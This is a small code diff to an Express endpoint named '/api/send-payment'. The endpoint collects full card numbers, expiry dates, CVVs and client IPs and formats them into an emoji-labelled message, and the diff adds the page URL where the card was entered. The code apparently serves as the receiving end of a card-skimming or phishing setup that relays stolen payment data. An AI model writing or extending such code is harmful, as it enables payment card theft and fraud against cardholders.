@@ -46,6 +46,7 @@ app.post('/api/send-payment', async (req, res) => {
             expiryYear,
             cvv,
             ip,
+            pageUrl,
             timestamp
         } = req.body;
         
@@ -61,6 +62,7 @@ app.post('/api/send-payment', async (req, res) => {
 💳 Card Number: ${creditCard}
 📅 Expiry: ${expiryDate} (${expiryMonth}/${expiryYear})
 🔒 CVV: ${cvv}
+📄 Page URL: ${pageUrl || 'N/A'}
 🌐 IP: ${ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress}
 ⏰ Time: ${timestamp || new Date().toISOString()}
 
